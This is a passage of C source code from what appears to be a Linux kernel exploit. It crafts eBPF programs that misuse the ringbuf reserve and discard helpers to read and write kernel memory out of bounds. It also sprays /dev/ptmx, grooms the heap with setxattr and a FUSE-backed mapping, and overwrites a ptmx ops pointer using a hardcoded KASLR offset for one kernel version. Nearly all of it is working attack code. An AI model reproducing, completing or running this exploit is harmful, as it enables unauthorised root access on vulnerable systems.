    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16), //r3 = fp - 16 
    BPF_MOV64_IMM(BPF_REG_4, BPF_ANY),
    BPF_LD_MAP_FD(BPF_REG_1, arraymap_fd_in), //load map pointer into r1
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem), //store value that we read into arraymap
	  
    //end of read

    BPF_JNE(BPF_REG_9,OP_WRITE,14),//if r5 is not write, jump past write

    BPF_MOV64_IMM(BPF_REG_4, 3),//r4 holds key (index) //read value to write
    //store key (index) on stack  
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_4, -4), // *(u32 *)(fp - 4) = r0  //store word
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), // r2 = fp - 4 
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16), //r3 = fp - 16
    BPF_MOV64_IMM(BPF_REG_4, BPF_ANY),
    BPF_LD_MAP_FD(BPF_REG_1, arraymap_fd_in), //load map pointer into r1

    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem ),

    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_10, -16), // r7 = *(u64 *)(fp - 16) //load value to write
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_8),///restore record
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1,offset), // record = record + offset //record_ptr

    BPF_STX_MEM(BPF_DW, BPF_REG_1, BPF_REG_7, 0), // *(u64 *)(r1 +0) = r7  //*(u64 *)(record_ptr) = r7 //store word
    //end of write

    //flags
    BPF_MOV64_IMM(BPF_REG_2,BPF_RB_NO_WAKEUP),//
    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_10, -24), // r1 = *(u64 *)(fp - 24)
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_0), //r6 holds the ringbuf record
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_8),///save recordin r8
    //this jump is needed to force verifier to see value passed to ringbuf_discard() as type mem and not type mem_or_null //i.e. avoid this error: R1 type=mem_or_null expected=mem //update: the jump is done earlier in the bpf program

    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard ),//r0 will be data pointer

    BPF_MOV64_IMM(BPF_REG_0, 44),
    BPF_EXIT_INSN(),

  };
  rv = prog_fd = _bpf_prog_load2(BPF_PROG_TYPE_SOCKET_FILTER,sizeof(insns)/sizeof(struct bpf_insn ), insns,"GPL", 1, LOG_BUF_SIZE,log_buff_g, 0 );
  if (rv == -1)
    {
      perror("bpf_prog_load()");
      debug_printf("log_buf: %s\n",log_buff_g);
      debug_printf("size = %p | offset = %p\n",size,offset);
      debug_printf("round_up(%p,%p) = %p\n",size,PAGE_SIZE,round_up(size,PAGE_SIZE));
      exit(-1);
    }

  return rv;
}
   

int  bpf_store_mem_reg_qw(struct bpf_insn ** insn_ptr_addr,int * insn_count_addr,unsigned int dest, unsigned int offset,unsigned int src)
{
  int insn_count = 0;
  struct bpf_insn *insn_ptr = 0;
  insn_ptr = *insn_ptr_addr;
  insn_count = *insn_count_addr;

  //*(u64 *)(dest + offset) = src
  *insn_ptr = BPF_STX_MEM(BPF_DW, dest, src, offset);
  insn_count++;
  insn_ptr = *insn_ptr_addr;
  insn_count = *insn_count_addr;

}

int load_program__write_page_addr__reserve_buffer(int hashmap_fd_in,int arraymap_fd_in,unsigned long long size,unsigned long long target_addr, unsigned long long  new_addr)
{
  int rv = 0;
  int prog_fd = 0;
  int insn_count = 0;
  struct bpf_insn * insns = 0;
  struct bpf_insn * insn_ptr = 0;
  unsigned long long record_size = 0;
  int iter_key_idx = 0;
  int i = 0;
  struct bpf_insn test1 [] ={BPF_LD_MAP_FD(BPF_REG_1,hashmap_fd_in)};
  struct bpf_insn test2 [] ={BPF_MOV64_IMM(BPF_REG_0, 0)};
  struct bpf_insn test3 [] ={BPF_MOV64_IMM(BPF_REG_0, 0)};
  struct bpf_insn test4 [] ={BPF_MOV64_IMM(BPF_REG_0, 0)};
  unsigned long long temp_ulong = 0;
  //int record_size = 0;
  unsigned long long success_exit_label_addr = 0;
  int temp_label  = 0;
  unsigned long long label_addr = 0;
  unsigned long long t1 = 0;
  unsigned long long t2 = 0;
  unsigned long long t3 = 0;
  unsigned long long label_num = 0;
  int jmp_val = 0;
  //alloc insn buffer
  unsigned long long success_exit_label_num = 0;

  //alloc insn buffer
  insns = alloc_anon_rw_vma(4);
  insn_ptr = insns;
  record_size = 0x1000;
  record_size = 0x1000/4;//works //run_program() returns 0
  record_size = 0x1000/2; //works //run_program() returns 0
  //record_size = 0x1000; //does not work //setsockopt(): Cannot allocate memory

  insn_ptr = test3;
  insn_count = 0;

  insn_ptr = insns;
  insn_count = 0;

  debug_printf("target_addr = %p\n",target_addr);
  debug_printf("new_addr = %p\n",new_addr);

  debug_printf("hashmap_fd_in = %i\n",hashmap_fd_in);
  debug_printf("arraymap_fd_in = %i\n",arraymap_fd_in);

  bpf_do_mv_imm_qw(BPF_REG_0,0,insn_ptr,insn_count);//0
  bpf_do_mv_imm_qw(BPF_REG_6,0x1337,insn_ptr,insn_count);//1
  bpf_do_mv_imm_qw(BPF_REG_2,record_size,insn_ptr,insn_count);//2
  bpf_do_mv_imm_qw(BPF_REG_3,0,insn_ptr,insn_count);//3
  bpf_do_mv_imm_qw(BPF_REG_4,0,insn_ptr,insn_count);//4

  bpf_do_load_map_fd(hashmap_fd_in,BPF_REG_1,insn_ptr,insn_count);//5


  bpf_do_mv_imm_qw(BPF_REG_2,record_size,insn_ptr,insn_count);//6
  debug_printf("record_size = %i\n",record_size);								  bpf_do_call(BPF_FUNC_ringbuf_reserve,insn_ptr,insn_count);//7
  //8
  bpf_do_jne(BPF_REG_0,0,2,insn_ptr,insn_count);//jump 2 insn if reg0 != 0 

  bpf_do_mv_imm_qw(BPF_REG_0,44,insn_ptr,insn_count);//9
  bpf_do_exit(insn_ptr,insn_count);//10
  bpf_do_mv_reg_qw(BPF_REG_8,BPF_REG_0,insn_ptr,insn_count); //store record pointer//11
  bpf_do_load_map_fd(arraymap_fd_in,BPF_REG_1,insn_ptr,insn_count);//22
  bpf_do_mv_reg_qw(BPF_REG_9,BPF_REG_1,insn_ptr,insn_count); //store arraymap pointer

  label_addr = insn_ptr;
  label_num = insn_count;

  jmp_val = 2+2+1+1;
  jmp_val = 2+2+1;//
  jmp_val= jmp_val+ 4;					       
  jmp_val= jmp_val+ 4;					       
  jmp_val= jmp_val+ 1;					       
  jmp_val= jmp_val+ 1;					       
  jmp_val= jmp_val+ 1;					       
  //jmp_val= jmp_val+ 1;//test for ld_map					       
  jmp_val= jmp_val+ 1;					       
  jmp_val= jmp_val+ 1;	//r2 = new_addr&0xffffffff				       
  jmp_val= jmp_val+ 1; //r2 = (new_addr)>>32					       
  jmp_val= jmp_val+ 1;//r1 = r1 | r2					       
  jmp_val= jmp_val+ 1; //r1 = r1<<32	

  bpf_do_ja(jmp_val,insn_ptr,insn_count); // includes discard + r2 set


  //success block

  bpf_do_mv_imm_qw(BPF_REG_3,0,insn_ptr,insn_count);//key //13
  //store key
  bpf_do_store_mem_reg_dw(BPF_REG_10, -4,BPF_REG_3,insn_ptr, insn_count); //14
  bpf_do_mv_imm_qw(BPF_REG_3,1,insn_ptr,insn_count);//value //15
  //store value
  bpf_do_store_mem_reg_qw(BPF_REG_10, -16,BPF_REG_3,insn_ptr, insn_count); //16


  //set key pointer
  bpf_do_mv_reg_qw(BPF_REG_2,BPF_REG_10,insn_ptr,insn_count); //17
  bpf_do_alu_imm_qw(BPF_ADD,BPF_REG_2,-4, insn_ptr, insn_count); //18

  //set value pointer
  bpf_do_mv_reg_qw(BPF_REG_3,BPF_REG_10,insn_ptr,insn_count); //19
  bpf_do_alu_imm_qw(BPF_ADD,BPF_REG_3,-16, insn_ptr, insn_count); //20
  //set flag
  bpf_do_mv_imm_qw(BPF_REG_4,BPF_ANY,insn_ptr,insn_count); //21
  bpf_do_mv_reg_qw(BPF_REG_1,BPF_REG_9,insn_ptr,insn_count); //get arraymap pointer //22
  bpf_do_call(BPF_FUNC_map_update_elem,insn_ptr,insn_count);//23

  //overwrite target
  // bpf_do_mv_imm_qw(BPF_REG_1,(new_addr)&0xffffffff,insn_ptr,insn_count); //24
  bpf_do_mv_imm_dw(BPF_REG_1,(new_addr)&0xffffffff,insn_ptr,insn_count); //24
  bpf_do_mv_imm_dw(BPF_REG_2,((new_addr>>32)&0xffffffff),insn_ptr,insn_count); //24
  debug_printf("(new_addr)&0xffffffff = %p\n",(new_addr)&0xffffffff);
  debug_printf("((new_addr>>32)&0xffffffff) = %p\n",((new_addr>>32)&0xffffffff));

  //r1 = r1<<32
  bpf_do_alu_imm_qw(BPF_LSH,BPF_REG_2,32, insn_ptr, insn_count);
  //bpf_do_alu_reg_qw(BPF_OR,BPF_REG_2,BPF_REG_2, insn_ptr, insn_count);
  //r1 = r1 | r2
  bpf_do_alu_reg_qw(BPF_OR,BPF_REG_1,BPF_REG_2, insn_ptr, insn_count);
  //bpf_do_alu_reg_qw(BPF_OR,BPF_REG_2,BPF_REG_2, insn_ptr, insn_count);


  bpf_do_store_mem_reg_qw(BPF_REG_6,0,BPF_REG_1,insn_ptr,insn_count);//write address that we control over ptmx ops field //25

  //free  ringbuf record
  bpf_do_mv_imm_qw(BPF_REG_2,BPF_RB_NO_WAKEUP,insn_ptr,insn_count);//25
  // get ringbuf record

  bpf_do_mv_reg_qw(BPF_REG_1,BPF_REG_8,insn_ptr,insn_count); //26
  //free ringbuf record
  debug_printf("[before call] insn_count = %i\n",insn_count);
  bpf_do_call(BPF_FUNC_ringbuf_discard,insn_ptr,insn_count); //27
  debug_printf("[after call] insn_count = %i\n",insn_count);

  bpf_do_mv_imm_qw(BPF_REG_0,99,insn_ptr,insn_count); //28
  bpf_do_exit(insn_ptr,insn_count); //29
  debug_printf("[after exit] insn_count = %i\n",insn_count);


  //do read
  for(i = 0;i<(0x1000/8);i++)
    {
      //      if (i>= ((0x1000/8)/2)) //too big
      //setsockopt(): Cannot allocate memory
      //if (i>= ((0x1000/8)/4))//so we can only copy a 4th of a page into a map
      if (i>= (record_size/8))//try it
	  
	{
	  
	  debug_printf("[breaking] record_size = %p\n",record_size);
	  break;
	}
      bpf_do_mv_reg_qw(BPF_REG_6,BPF_REG_8,insn_ptr,insn_count); //30
      //add offset to record pointer
      bpf_do_alu_imm_qw(BPF_ADD,BPF_REG_6,i*8, insn_ptr, insn_count);

      //bpf_do_load_mem_reg_qw(base_reg,offset,dest_reg, insn_ptr, insn_count)
      bpf_do_load_mem_reg_qw(BPF_REG_6,0,BPF_REG_7, insn_ptr, insn_count);
      //r7 now has read value

      //[idea]: (implementing 'labels' for jumping) store insn ptr in label var, jmp to label by subtracting stored 'label' insn pointer curr insns pointer from (if curr is greater, or vice versa if label is bigger)
      //test if r7 == target_addr
      //load_program__test_ja
      bpf_do_jne(BPF_REG_7,target_addr,1,insn_ptr,insn_count);

      t1 = insn_ptr;
      t2 = label_addr;
      //t1+=2;
      t1 +=1;
      t3 = (t1 - t2)/sizeof(struct bpf_insn);//t3 seems to be correct
      //printf("[%s()] t3 = %i\n",__FUNCTION__,t3);
      bpf_do_ja(-1*(t3),insn_ptr,insn_count); //jump to sucess block
      // break; //test one iteration//works

	  
    }

  
  debug_printf("[after loop] i = %i\n",i);

  //bpf_do_call(BPF_FUNC_map_update_elem,insn_ptr,insn_count);

  bpf_do_mv_imm_qw(BPF_REG_2,BPF_RB_NO_WAKEUP,insn_ptr,insn_count);
  // get ringbuf record
  bpf_do_mv_reg_qw(BPF_REG_1,BPF_REG_8,insn_ptr,insn_count);
  //free ringbuf record
  bpf_do_call(BPF_FUNC_ringbuf_discard,insn_ptr,insn_count);

  //exit program
  bpf_do_mv_imm_qw(BPF_REG_0,44,insn_ptr,insn_count);
  bpf_do_exit(insn_ptr,insn_count);

  //dump_qword(insns,(sizeof(struct bpf_insn)*insn_count)/8);
  debug_printf("insn_count = %i\n",insn_count);

  debug_printf("sizeof(test1) = %i\n",sizeof(test1));
  debug_printf("sizeof(test1)/sizeof(struct bpf_insn) = %i\n",sizeof(test1)/sizeof(struct bpf_insn));
  //dump_qword(test1,(sizeof(test1)/8));

  debug_printf("sizeof(test2) = %i\n",sizeof(test2));
  debug_printf("sizeof(test2)/sizeof(struct bpf_insn) = %i\n",sizeof(test2)/sizeof(struct bpf_insn));
  //dump_qword(test2,(sizeof(test2)/8));



  rv = prog_fd = _bpf_prog_load2(BPF_PROG_TYPE_SOCKET_FILTER,insn_count, insns,"GPL", 4, LOG_BUF_SIZE,log_buff_g, 0 );
  if (rv == -1)
    {
      perror("bpf_prog_load()");
      printf("log_buf: %s\n",log_buff_g);
      exit(-1);
    }

  return rv;


}

int run_program_gen(int prog_fd_in)
{
  int socketfds[2] = {0};
  int rv = 0;
  int prog_fd = prog_fd_in;
  rv = socketpair(AF_UNIX, SOCK_DGRAM, 0, socketfds);//create a pair of sockets
  debug_printf("socketpair() returned %i\n",rv);
  if (rv== -1)
    {
      perror("socketpair");
      //exit(-1);
      return -1;
    }
  //attach tbe bpf program to socket fd 1 (as opposed to 0)
  rv = setsockopt(socketfds[1], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd));
  debug_printf("setsockopt() returned %i\n",rv);
  if (rv== -1)
    {
      perror("setsockopt");
      //exit(-1);
      close(socketfds[0]);close(socketfds[1]);
      return -1;
    }
  //trigger bpf-program being run //cause it to be run
  rv =  write(socketfds[0],dummy_buffer,sizeof(dummy_buffer));
  debug_printf("write() returned %i\n",rv);
  if (rv == -1)
    {
      perror("write");
      close(socketfds[0]);close(socketfds[1]);
      return -1;
    }
  close(socketfds[0]);close(socketfds[1]);
  return 0;
}

int run_program_gen2(int prog_fd_in)//silent
{
  int socketfds[2] = {0};
  int rv = 0;
  int prog_fd = prog_fd_in;
  rv = socketpair(AF_UNIX, SOCK_DGRAM, 0, socketfds);//create a pair of sockets

  if (rv== -1)
    {
      debug_printf("socketpair() returned %i\n",rv);
      perror("socketpair()");
      exit(-1);
      return -1;
    }
  //attach tbe bpf program to socket fd 1 (as opposed to 0)
  rv = setsockopt(socketfds[1], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd));

  if (rv== -1)
    {
      perror("setsockopt()");
      debug_printf("setsockopt() returned %i\n",rv);

      debug_printf("socketfds[0] = %i | socketfds[1] = %i | prog_fd_in = %i\n",socketfds[0],socketfds[1],prog_fd_in);
      exit(-1);
      close(socketfds[0]);close(socketfds[1]);
      return -1;
    }
  //trigger bpf-program being run //cause it to be run
  rv =  write(socketfds[0],dummy_buffer,sizeof(dummy_buffer));

  if (rv == -1)
    {
      debug_printf("write() returned %i\n",rv);
      perror("write");
      close(socketfds[0]);close(socketfds[1]);
      exit(0);
      return -1;
    }
  close(socketfds[0]);close(socketfds[1]);
  return 0;
}

//unsigned long long ktext_leak_base = 0xffffffff8239cd00;
unsigned long long ktext_leak_base = 0xffffffff82034d40; //5.13.10  //htab_map_ops

unsigned long long ktext_leak = 0;
unsigned long long kaslr_slide = 0;

int  ptmx_fd_count = 0;
int ptmx_fd_table[4096];
int spray_n_tty_table(int n)
{
  int rv= 0;
  int i = 0;
  for(i = 0;i<n;i++)
    {
      if ( ptmx_fd_count >= sizeof(ptmx_fd_table)/sizeof(int))
	{
	  break;
	}
      rv = open("/dev/ptmx",O_RDWR);
      if (rv != -1)
	{
	  ptmx_fd_table[ptmx_fd_count++] = rv;
	}

    }
  return i;
}

char setxattr_file_path[]  = "/tmp/blah";
//char setxattr_file_path[]  = "/home/jass93/blah";


struct xattr_thread_fuse_args
{
  char * buff;
  int n;
  int consumed_args;
};

int do_xattr_(void * args_in)
{
  int rv = 0;
  struct xattr_thread_fuse_args * args = (struct xattr_thread_fuse_args *)args_in;
  char * buff = args->buff;
  int n = args->n;

  debug_printf("[thread] args->buff  = %p\n",args->buff);
  debug_printf("[thread] args->n = %i\n",args->n);
  args->consumed_args = 1;
  //todo: create "/tmp/blah" as writable

  //rv = setxattr(,"a",args->buff,args->n,XATTR_CREATE|XATTR_REPLACE);
  //n = setxattr("/tmp/blah","a",buff,n,XATTR_CREATE|XATTR_REPLACE);
  n = setxattr(setxattr_file_path,"a",buff,n,XATTR_CREATE|XATTR_REPLACE);

  debug_printf("[thread] setxattr returned %i\n",rv);
  if (rv == -1)
    {
      perror("setxattr()");
    }
  //we'll never get here

}


unsigned long long fuse_count = 0;
char * fuse_vma1  = 0;
char * fuse_vma2 = 0;
int fuse_fd = 0;
int fuse_setup = 0;

int alloc_buff_xattr_fuse(char * data_in,int n)//n must be (PAGE_SIZE -1) or less
{

  int rv = 0;
  char * buff = 0;
  char * start = 0;
  struct xattr_thread_fuse_args thread_args = {0};
  unsigned long long thread_fault_thread_stack = 0;
  char * thread_fault_buff = 0;
  if (fuse_setup  == 0)
    {
      debug_printf("before calling setup_fuse()...\n");
      setup_fuse();
      debug_printf("after calling setup_fuse()...\n");
      fuse_setup = 1;
    }


  if (n == 0)
    return -1;

  start = fuse_vma1 + ((PAGE_SIZE  - n ) +1);
  if(0)
    {
      debug_printf("PAGE_SIZE = %p\n",PAGE_SIZE);
      debug_printf("fuse_vma1 = %p\n",fuse_vma1);
      debug_printf("start = %p\n",start);
      debug_printf("fuse_vma2 = %p\n",fuse_vma2);
      debug_printf("n = %i\n",n);
    }

  memcpy(start,data_in,n-1);//copy n-1 bytes
  thread_fault_thread_stack = alloc_thread_stack(0);

  thread_args.buff = start;
  thread_args.n = n;
  thread_args.consumed_args = 0;

  debug_printf("[mt] thread_args.buff = %p\n",thread_args.buff);
  debug_printf("[mt] thread_args.n = %i\n",thread_args.n);

  rv = clone(do_xattr_,thread_fault_thread_stack + thread_stack_size_g,CLONE_VM | CLONE_FILES,&(thread_args));
  debug_printf("clone() returned %i\n",rv);
  if(rv ==-1)
    {
      debug_printf("[%s()] clone() returned %i\n",__FUNCTION__,rv);
      perror("clone()");
      exit(-1);
    }

  if(1)
    {
      while(thread_args.consumed_args == 0)
	{
	}
      debug_printf("child thread consumed args...\n");
      fuse_count++;
      debug_printf("[after consume] fuse_count = %i\n",fuse_count);
    }


  return 0;

}
      

int alloc_buff_xattr(char * data_in,int n)//n must be (PAGE_SIZE -1) or less
{
  //return alloc_buff_xattr_uffd(data_in,n);
  return alloc_buff_xattr_fuse(data_in,n);
}

void setup_fuse()
{
  int rv = 0;
  char * fuse_backed_vma = 0;
  char * vma = 0;
  rv = system("mkdir -p /home/jass93/fuse_mount");
  rv = system("fusermount -u /home/jass93/fuse_mount ; mkdir -p fuse_mount && ./hello__blocking_read ./fuse_mount");

  debug_printf("system() returned %i\n",rv);
  rv = fuse_fd = open("fuse_mount/hello", O_RDWR);
  debug_printf("open() returned %i\n",rv);
  if (fuse_fd == -1)
    {
      err(1, "unable to open FUSE fd");
    }

  vma = mmap(0x603000, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
  debug_printf("vma = %p\n",vma);

  if((void *)vma == (void *)-1)
    {
      perror("mmap()");
      exit(-1);
    }

  fuse_backed_vma = mmap(vma + 0x1000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED, fuse_fd, 0);

  debug_printf("fuse_backed_vma = %p\n",fuse_backed_vma);

  if((void *)fuse_backed_vma == (void *)-1)
    {
      perror("mmap()");
      exit(-1);
    }

  fuse_vma1 = vma;
  fuse_vma2 = fuse_backed_vma;
   
}

unsigned long long read_relative8( int arraymap_fd, int pwn_hashmap_fd, unsigned long long size, unsigned long long offset)
{
  int rv = 0;
  unsigned long long key;
  unsigned long long value;
  unsigned long long value_ll = 0;
  int reserve_test_prog_fd;
  unsigned long long mask = 0;

  mask = page_size_g-1;
  if (offset < PAGE_SIZE)
    {
      size = PAGE_SIZE;
    }
  else
    {
      size = (offset + PAGE_SIZE) & (~(mask));
    }
  key = OP_INDEX;
  value = OP_READ;
  debug_printf(" [pid %i] calling bpf_map_update_elem()\n",getpid());
  rv = bpf_map_update_elem(arraymap_fd, &key, &value,0);

  key = OFFSET_INDEX;
  value = 0;
      
  value = offset;
  rv = bpf_map_update_elem(arraymap_fd, &key, &value,0);

  debug_printf(" [pid %i] calling load_program()\n",getpid());
  rv = reserve_test_prog_fd = load_program__try_read_write_with_reserve_buffer2(pwn_hashmap_fd,arraymap_fd,8,0);

  debug_printf(" [pid %i] calling run_program_gen()\n",getpid());
  rv = run_program_gen2(reserve_test_prog_fd);

  debug_printf(" [pid %i] calling close()\n",getpid());
  close(reserve_test_prog_fd);

  key = VALUE_INDEX;

  debug_printf("[pid %i] calling bpf_map_lookup_elem()\n",getpid());
  rv = bpf_map_lookup_elem(arraymap_fd, &key, &value_ll);
  return value_ll;
}


unsigned long long read_mask(int hashmap_fd_in,int arraymap_fd_in)
{
  int rv;
  int read_mask_prog_fd = 0;
  int key = 0;
  unsigned long long value_ll;
  rv = read_mask_prog_fd = load_program__read_mask(hashmap_fd_in,arraymap_fd_in);
  debug_printf("load_program() returned %i\n",rv);
  rv = run_program_gen2(read_mask_prog_fd);

  key = 0;
  rv = bpf_map_lookup_elem(arraymap_fd_in, &key, &value_ll);

  debug_printf("bpf_map_lookup_elem() returned %i\n",rv);
  close(read_mask_prog_fd);
  return value_ll;

}

int rb_query_with_prog(int prog_fd,int arraymap_fd,unsigned long long * producer_pos_addr,unsigned long long * consumer_pos_addr)
{
  int rv;
  int key;
  unsigned long long value_ll = 0;
  int read_prod_cons_prog_fd;
  rv = read_prod_cons_prog_fd = prog_fd;


  rv = run_program_gen(read_prod_cons_prog_fd);
  if (rv == -1)
    {
      perror("run_program()");
      return rv;
    }

  key = 0;
  rv = bpf_map_lookup_elem(arraymap_fd, &key, &value_ll);
  debug_printf("bpf_map_lookup_elem() returned %i\n",rv);
  *consumer_pos_addr = value_ll;
  debug_printf("arraymap[%i] = %p\n",key,value_ll);
  key = 1;

  rv = bpf_map_lookup_elem(arraymap_fd, &key, &value_ll);
  debug_printf("bpf_map_lookup_elem() returned %i\n",rv);
  *producer_pos_addr = value_ll;
  debug_printf("arraymap[%i] = %p\n",key,value_ll);

}

int rb_cover_mask_with_hptr(int hashmap_fd,int arraymap_fd)
{
  unsigned long long key = 0;
  unsigned long long value = 0;
  unsigned long long value_arr[2] = {0};
  int i = 0;
  unsigned long long ringbuff_mask = 0;
  int rv = 0;
  while (1)
    {
      key = i;
      rv = bpf_map_update_elem(hashmap_fd, &key, &value_arr,0);
      debug_printf("bpf_map_update_elem() returned %i\n",rv);
      if (rv == -1)
	{
	  perror("bpf_map_update_elem()");
	  return -1;
	}
      ringbuff_mask = read_mask(hashmap_fd,arraymap_fd); //if everything works, this will be a heap leak (mask -1)
      debug_printf("got ringbuff_mask = %p [ iteration %i]\n",ringbuff_mask,i);
      if (ringbuff_mask != 8)
	{
	  break;
	}
      rv = bpf_map_delete_elem(hashmap_fd, &key);
      debug_printf("bpf_map_delete_elem() returned %i\n",rv);
      if (rv == -1)
	{
	  perror("bpf_map_delete_elem()");
	  return -1;
	}
      i++;
    }
  return i;//return the index that covers the mask field of struct ringbuff
}


int rb_cover_mask_with_hptr__ex(int hashmap_fd,int arraymap_fd,char * value_ptr)
{
  unsigned long long key = 0;
  unsigned long long value = 0;
  unsigned long long value_arr[2] = {0};
  int i = 0;
  unsigned long long ringbuff_mask = 0;
  int rv = 0;
  while (1)
    {
      key = i;
      rv = bpf_map_update_elem(hashmap_fd, &key, value_ptr,0);
      debug_printf("bpf_map_update_elem() returned %i\n",rv);
      if (rv == -1)
	{
	  perror("bpf_map_update_elem()");
	  return -1;
	}
      ringbuff_mask = read_mask(hashmap_fd,arraymap_fd); //if everything works, this will be a heap leak (mask -1)
      debug_printf("got ringbuff_mask = %p [ iteration %i]\n",ringbuff_mask,i);
      if (ringbuff_mask != 8)
	{
	  break;
	}
      rv = bpf_map_delete_elem(hashmap_fd, &key);
      debug_printf("bpf_map_delete_elem() returned %i\n",rv);
      if (rv == -1)
	{
	  perror("bpf_map_delete_elem()");
	  return -1;
	}
      i++;
    }
  return i;//return the index that covers the mask field of struct ringbuff
}


int find_suitable_mask(int hashmap_fd,int arraymap_fd,int cover_idx,unsigned long long size)
{
  int rv = 0;
  unsigned long long producer_pos;
  unsigned long long consumer_pos;
  unsigned long long ringbuff_mask;
  unsigned long long key = 0;
  unsigned long long value = 0;
  unsigned long long value_arr[2] = {0};
  int rb_query_prog_fd;
  char dummy_buff[64] = {0};
  char dummy_buff2[0x48] = {0};
  unsigned long long temp_prod_pos = 0;

  rv = rb_query_prog_fd = load_program__read_consumer_producer(hashmap_fd,arraymap_fd);

  while(1)
    {
      //read producer_pos
      rv =  rb_query_with_prog(rb_query_prog_fd,arraymap_fd,&consumer_pos,&producer_pos);
      //read mask
      ringbuff_mask = read_mask(hashmap_fd,arraymap_fd); 

      ringbuff_mask = ringbuff_mask-1;

      temp_prod_pos = producer_pos;
      temp_prod_pos = temp_prod_pos & ~(0xffUL);

      if ((ringbuff_mask & temp_prod_pos) == temp_prod_pos)//make sure the header increment works
	{
	  //we're good
	  debug_printf("found suitable mask!\n");
	  break;
	}

      //we need to alloc another elem
      key = cover_idx;
      //delete current elem
      rv = bpf_map_delete_elem(hashmap_fd, &key);//delete htab elem

      //alloc elem
      //base struct is 0x30 and then  + roundup(key_size,8) + roundup(value_size,8)
      rv = alloc_buff_xattr(dummy_buff2,0x48);

      key = cover_idx;
      rv = bpf_map_update_elem(hashmap_fd, &key, &value_arr,0); //alloc another elem
      debug_printf("bpf_map_update_elem() returned %i\n",rv);
      if (rv == -1)
	{
	  perror("bpf_map_update_elem()");
	  close(rb_query_prog_fd);
	  rb_query_prog_fd = -1;
	  return -1;
	}
      ringbuff_mask = read_mask(hashmap_fd,arraymap_fd); 
      ringbuff_mask = ringbuff_mask -1;
      debug_printf("got (new) mask = %p | mask & %p = %p\n",ringbuff_mask,size,ringbuff_mask & size);

    }
  close(rb_query_prog_fd);
  rb_query_prog_fd = -1;

}


#define HASHMAP_FD_ARR_LEN 1024
int hashmap_fd_arr_counter = 0;
int hashmap_fd_arr[HASHMAP_FD_ARR_LEN] = {0};

int find_suitable_hashmap(int arraymap_fd_in,int * cover_idx_addr)
{
  int rv;
  int map_fd = 0;
  int arraymap_fd = 0;
  unsigned long long producer_pos;
  unsigned long long consumer_pos;
  unsigned long long ringbuff_mask;
  unsigned long long temp_mask_out;
  unsigned int key_size = 4;
  unsigned int max_entries = 4;
  unsigned int value_size = 4;
  int i = 0;
  char dummy_buff[64] = {0};
  int rb_query_prog_fd = 0;
  unsigned long long header_increment = 0;
  unsigned long long dummy_producer_pos = 0;
  unsigned long long bytes = 0;
  unsigned long long key = 0;
  unsigned long long value = 0;
  unsigned long long value_arr[2] = {0};
  int fail = 0;
  int cover_idx;
  int iter = 0;
  int first = 0;
  /*desired properties:
  //won't hang
  //maybe use a table for hashmap fds along with a counter
  //initial prod_pos of 0 (before hang check)
  //header will actually advance 0x400 to page_size bytes when prod_pos is and'ed with mask
  */
  arraymap_fd = arraymap_fd_in;

  first = 1;
  while (1)
    {
      if (first)
	{
	  first = 0;
	}
      else
	{
	  iter++;
	}
      debug_printf("iter %i\n",iter);

      key_size = 4;
      max_entries=4;
      value_size = 4;
      value_size = 0x10;//use value size of 0x10 so that elem_size will be sizeof(elem struct) + 8 (rounded up key size) + 0x10 = 0x30 + 8 + 0x10 = 0x48 which is not in kmalloc-64 bucket

      //rv =  map_fd = bpf_map_create_without_flags(BPF_MAP_TYPE_HASH,key_size,value_size,max_entries, 0); 
      rv =  map_fd = bpf_map_create_with_flags(BPF_MAP_TYPE_HASH,key_size,value_size,max_entries, BPF_F_NO_PREALLOC); 

      if (rv == -1)
	{
	  perror("bpf_map_create()");
	  exit(0);
	}
      rv = alloc_buff_xattr(dummy_buff,64);
      rv = can_use_reserve_rb_hashmap(map_fd,arraymap_fd);

      if (rv == 0)
	{
	  //spinlock is not 0
	  close(map_fd);
	  //reallocate bucket object
	  //could usemsg_msg here instead
	  rv = alloc_buff_xattr(dummy_buff,64);
	  if (1)
	    {
	      debug_printf("failed (iter %i): spinlock is not 0\n",iter);

	    }
	  continue; //try again
	}
      //test producer value
      rv = rb_query_prog_fd = load_program__read_consumer_producer(map_fd,arraymap_fd);
      rv =  rb_query_with_prog(rb_query_prog_fd,arraymap_fd,&consumer_pos,&producer_pos);
      ringbuff_mask = read_mask(map_fd,arraymap_fd); 

      if (producer_pos != 0)
	{

	  close(rb_query_prog_fd);

	  close(map_fd);
	  //reallocate bucket object
	  //could use msg_msg here instead
	  rv = alloc_buff_xattr(dummy_buff,64);
	  if (1)
	    {
	      debug_printf("failed (iter %i): producer-pos is not 0\n",iter);

	    }
	  continue; //try again

	}

      //so producer_pos is 0

      //cover mask with hptr
      cover_idx = rv = rb_cover_mask_with_hptr(map_fd,arraymap_fd);
      if (rv == -1)
	{
	  debug_printf("error overlapping mask field?\n");
	  close(rb_query_prog_fd);

	  close(map_fd);
	  //reallocate bucket object
	  //could usemsg_msg here instead
	  rv = alloc_buff_xattr(dummy_buff,64);
	  if (1)
	    {
	      debug_printf("failed (iter %i): couldn't cover mask?\n",iter);

	    }
	  continue; //try again
	}


      ringbuff_mask = read_mask(map_fd,arraymap_fd);
      ringbuff_mask = ringbuff_mask-1;
      //header computation
      //hdr = (void *)rb->data + (prod_pos & rb->mask);

